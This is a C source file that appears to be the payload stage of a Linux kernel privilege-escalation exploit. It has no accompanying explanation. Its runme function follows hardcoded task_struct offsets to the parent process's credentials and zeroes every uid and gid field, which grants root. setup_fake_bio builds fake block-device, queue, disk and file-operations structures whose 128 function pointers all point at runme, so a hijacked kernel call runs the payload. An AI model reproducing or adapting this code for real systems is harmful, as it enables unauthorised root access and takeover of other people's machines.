#include <stdint.h>
#include <stdbool.h>

#define FAKE_STRUCT_SIZE ((0x1000))

typedef uint8_t u8;
typedef uint32_t u32;
typedef uint64_t u64;

static uint8_t fake_bdev[FAKE_STRUCT_SIZE];
static uint8_t fake_queue[FAKE_STRUCT_SIZE];
static uint8_t fake_disk[FAKE_STRUCT_SIZE];
static uint8_t fake_disk_fops[FAKE_STRUCT_SIZE];

typedef struct fake_cred {
    u32 padding;
    u32 uid;
    u32 gid;
    u32 suid;
    u32 sgid;
    u32 euid;
    u32 egid;
} fake_cred;

int runme(uint64_t rdi, uint64_t rsi, uint64_t rdx) {
    // parent pointer is at 0x578 into task struct
    uint64_t current_task, parent_task;
    asm volatile ("mov %%gs:0x1ad00, %0" : "=r"(current_task));

    parent_task = *((uint64_t *)(current_task + 0x578));

    asm volatile("mov %0, %%rdi" : "+r"(parent_task));

    // This is the "cred" field (not real_cred) which seems to point to the same cred in practice
    fake_cred *cred_ptr = (fake_cred *)(*(uint64_t *)(parent_task + 0x728));

    cred_ptr->uid = 0;
    cred_ptr->gid = 0;
    cred_ptr->suid = 0;
    cred_ptr->sgid = 0;
    cred_ptr->euid = 0;
    cred_ptr->egid = 0;

    return -1;
}

void setup_fake_bio(uint64_t addr) {
    for (int i = 0; i < FAKE_STRUCT_SIZE; i++) {
        fake_bdev[i] = 0;
        fake_disk[i] = 0;
        fake_queue[i] = 0;
        fake_disk_fops[i] = 0;
    }

    uint8_t *ptr = (uint8_t *)addr;
    *(uint64_t *)(&ptr[0x34]) = 0;
    *(uint64_t *)(&ptr[0x08]) = (uint64_t)fake_bdev;

    *(uint64_t *)(&fake_bdev[0x340]) = (uint64_t)fake_queue;

    *(uint64_t *)(&fake_queue[0x68]) = 0x10000;

    *(uint64_t *)(&fake_queue[0x80]) = (uint64_t)fake_disk;

    *(uint64_t *)(&fake_disk[0x48]) = (uint64_t)fake_disk_fops;

    for (int i = 0; i < 128; i++) {
        ((uint64_t *)fake_disk_fops)[i] = &runme;
    }
}
